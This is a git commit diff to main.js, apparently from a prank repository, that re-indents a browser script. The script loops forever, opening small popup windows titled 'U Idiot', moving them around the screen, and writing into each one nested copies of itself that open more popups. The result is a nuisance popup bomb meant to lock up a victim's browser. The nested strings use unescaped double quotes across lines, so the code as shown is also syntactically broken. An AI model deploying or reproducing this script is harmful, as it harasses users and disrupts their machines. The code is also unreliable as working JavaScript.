902912ab164cd4a5cc5eb022c2af994c2ac090e0
ToasterSploit <62103723+ToasterSploit@users.noreply.github.com>
2020-07-15 22:46:46 +0200

    Update main.js

--- main.js
+++ main.js
@@ -33,216 +33,222 @@ while (0 < 10) {
 		upOrDown = true
 	}
 	myWindow = window.open("", "", "width=150, height=150");
-	myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>var myWindow
-var leftOrRight = false
-var upOrDown = false
+	myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>
+		var myWindow;
+		var leftOrRight = false;
+		var upOrDown = false;
 
-var x = Math.random() * 1000
-var y = Math.random() * 1000
+		var x = Math.random() * 1000;
+		var y = Math.random() * 1000;
 
-var name = "0"
-while (0 < 10) {
-	if (leftOrRight == true) {
-		x = x - 20
-	} else {
-		x = x + 20
-	}
+		var name = "0";
+		while (0 < 10) {
+			if (leftOrRight == true) {
+				x = x - 20;
+			} else {
+				x = x + 20;
+			}
 
-	if (upOrDown == true) {
-		y = y - 20
-	} else {
-		y = y + 20
-	}
+			if (upOrDown == true) {
+				y = y - 20;
+			} else {
+				y = y + 20;
+			}
 
-	if (x < 0) {
-		leftOrRight = false
-	} else if (x > 1200) {
-		leftOrRight = true
-	}
+			if (x < 0) {
+				leftOrRight = false;
+			} else if (x > 1200) {
+				leftOrRight = true;
+			}
 
-	if (y < 0) {
-		upOrDown = false
-	} else if (y > 800) {
-		upOrDown = true
-	}
-	myWindow = window.open("", "", "width=150, height=150");
-	myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>var myWindow
-var leftOrRight = false
-var upOrDown = false
+			if (y < 0) {
+				upOrDown = false;
+			} else if (y > 800) {
+				upOrDown = true;
+			}
+			myWindow = window.open("", "", "width=150, height=150");
+			myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>
+				var myWindow
+				var leftOrRight = false
+				var upOrDown = false
 
-var x = Math.random() * 1000
-var y = Math.random() * 1000
+				var x = Math.random() * 1000
+				var y = Math.random() * 1000
 
-var name = "0"
-while (0 < 10) {
-	if (leftOrRight == true) {
-		x = x - 20
-	} else {
-		x = x + 20
-	}
+				var name = "0"
+				while (0 < 10) {
+					if (leftOrRight == true) {
+						x = x - 20
+					} else {
+						x = x + 20
+					}
 
-	if (upOrDown == true) {
-		y = y - 20
-	} else {
-		y = y + 20
-	}
+					if (upOrDown == true) {
+						y = y - 20
+					} else {
+						y = y + 20
+					}
 
-	if (x < 0) {
-		leftOrRight = false
-	} else if (x > 1200) {
-		leftOrRight = true
-	}
+					if (x < 0) {
+						leftOrRight = false
+					} else if (x > 1200) {
+						leftOrRight = true
+					}
 
-	if (y < 0) {
-		upOrDown = false
-	} else if (y > 800) {
-		upOrDown = true
-	}
-	myWindow = window.open("", "", "width=150, height=150");
-	myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>var myWindow
-var leftOrRight = false
-var upOrDown = false
+					if (y < 0) {
+						upOrDown = false
+					} else if (y > 800) {
+						upOrDown = true
+					}
+					myWindow = window.open("", "", "width=150, height=150");
+					myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>
+						var myWindow
+						var leftOrRight = false
+						var upOrDown = false
 
-var x = Math.random() * 1000
-var y = Math.random() * 1000
+						var x = Math.random() * 1000
+						var y = Math.random() * 1000
 
-var name = "0"
-while (0 < 10) {
-	if (leftOrRight == true) {
-		x = x - 20
-	} else {
-		x = x + 20
-	}
+						var name = "0"
+						while (0 < 10) {
+							if (leftOrRight == true) {
+								x = x - 20
+							} else {
+								x = x + 20
+							}
 
-	if (upOrDown == true) {
-		y = y - 20
-	} else {
-		y = y + 20
-	}
+							if (upOrDown == true) {
+								y = y - 20
+							} else {
+								y = y + 20
+							}
 
-	if (x < 0) {
-		leftOrRight = false
-	} else if (x > 1200) {
-		leftOrRight = true
-	}
+							if (x < 0) {
+								leftOrRight = false
+							} else if (x > 1200) {
+								leftOrRight = true
+							}
 
-	if (y < 0) {
-		upOrDown = false
-	} else if (y > 800) {
-		upOrDown = true
-	}
-	myWindow = window.open("", "", "width=150, height=150");
-	myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>var myWindow
-var leftOrRight = false
-var upOrDown = false
+							if (y < 0) {
+								upOrDown = false
+							} else if (y > 800) {
+								upOrDown = true
+							}
+							myWindow = window.open("", "", "width=150, height=150");
+							myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>
+								var myWindow
+								var leftOrRight = false
+								var upOrDown = false
 
-var x = Math.random() * 1000
-var y = Math.random() * 1000
+								var x = Math.random() * 1000
+								var y = Math.random() * 1000
 
-var name = "0"
-while (0 < 10) {
-	if (leftOrRight == true) {
-		x = x - 20
-	} else {
-		x = x + 20
-	}
+								var name = "0"
+								while (0 < 10) {
+									if (leftOrRight == true) {
+										x = x - 20
+									} else {
+										x = x + 20
+									}
 
-	if (upOrDown == true) {
-		y = y - 20
-	} else {
-		y = y + 20
-	}
+									if (upOrDown == true) {
+										y = y - 20
+									} else {
+										y = y + 20
+									}
 
-	if (x < 0) {
-		leftOrRight = false
-	} else if (x > 1200) {
-		leftOrRight = true
-	}
+									if (x < 0) {
+										leftOrRight = false
+									} else if (x > 1200) {
+										leftOrRight = true
+									}
 
-	if (y < 0) {
-		upOrDown = false
-	} else if (y > 800) {
-		upOrDown = true
-	}
-	myWindow = window.open("", "", "width=150, height=150");
-	myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>var myWindow
-var leftOrRight = false
-var upOrDown = false
+									if (y < 0) {
+										upOrDown = false
+									} else if (y > 800) {
+										upOrDown = true
+									}
+									myWindow = window.open("", "", "width=150, height=150");
+									myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>
+										var myWindow
+										var leftOrRight = false
+										var upOrDown = false
 
-var x = Math.random() * 1000
-var y = Math.random() * 1000
+										var x = Math.random() * 1000
+										var y = Math.random() * 1000
 
-var name = "0"
-while (0 < 10) {
-	if (leftOrRight == true) {
-		x = x - 20
-	} else {
-		x = x + 20
-	}
+										var name = "0"
+										while (0 < 10) {
+											if (leftOrRight == true) {
+												x = x - 20
+											} else {
+												x = x + 20
+											}
 
-	if (upOrDown == true) {
-		y = y - 20
-	} else {
-		y = y + 20
-	}
+											if (upOrDown == true) {
+												y = y - 20
+											} else {
+												y = y + 20
+											}
 
-	if (x < 0) {
-		leftOrRight = false
-	} else if (x > 1200) {
-		leftOrRight = true
-	}
+											if (x < 0) {
+												leftOrRight = false
+											} else if (x > 1200) {
+												leftOrRight = true
+											}
 
-	if (y < 0) {
-		upOrDown = false
-	} else if (y > 800) {
-		upOrDown = true
-	}
-	myWindow = window.open("", "", "width=150, height=150");
-	myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>var myWindow
-var leftOrRight = false
-var upOrDown = false
+											if (y < 0) {
+												upOrDown = false
+											} else if (y > 800) {
+												upOrDown = true
+											}
+											myWindow = window.open("", "", "width=150, height=150");
+											myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>
+												var myWindow
+												var leftOrRight = false
+												var upOrDown = false
 
-var x = Math.random() * 1000
-var y = Math.random() * 1000
+												var x = Math.random() * 1000
+												var y = Math.random() * 1000
 
-var name = "0"
-while (0 < 10) {
-	if (leftOrRight == true) {
-		x = x - 20
-	} else {
-		x = x + 20
-	}
+												var name = "0"
+												while (0 < 10) {
+													if (leftOrRight == true) {
+														x = x - 20
+													} else {
+														x = x + 20
+													}
 
-	if (upOrDown == true) {
-		y = y - 20
-	} else {
-		y = y + 20
-	}
+													if (upOrDown == true) {
+														y = y - 20
+													} else {
+														y = y + 20
+													}
 
-	if (x < 0) {
-		leftOrRight = false
-	} else if (x > 1200) {
-		leftOrRight = true
-	}
+													if (x < 0) {
+														leftOrRight = false
+													} else if (x > 1200) {
+														leftOrRight = true
+													}
 
-	if (y < 0) {
-		upOrDown = false
-	} else if (y > 800) {
-		upOrDown = true
-	}
-	myWindow = window.open("", "", "width=150, height=150");
-	myWindow.document.write("<title>U Idiot</title>");
-	myWindow.moveTo(x, y);
-}</script>");
-	myWindow.moveTo(x, y);
-}</script>");
-	myWindow.moveTo(x, y);
-}</script>");
-	myWindow.moveTo(x, y);
-}</script>");
-	myWindow.moveTo(x, y);
-}</script>");
-	myWindow.moveTo(x, y);
-}</script>");
+													if (y < 0) {
+														upOrDown = false
+													} else if (y > 800) {
+														upOrDown = true
+													}
+													myWindow = window.open("", "", "width=150, height=150");
+													myWindow.document.write("<title>U Idiot</title>");
+													myWindow.moveTo(x, y);
+												}</script>");
+											myWindow.moveTo(x, y);
+										}</script>");
+									myWindow.moveTo(x, y);
+								}</script>");
+							myWindow.moveTo(x, y);
+						}</script>");
+					myWindow.moveTo(x, y);
+				}</script>");
+			myWindow.moveTo(x, y);
+		}</script>");
 	myWindow.moveTo(x, y);
 }
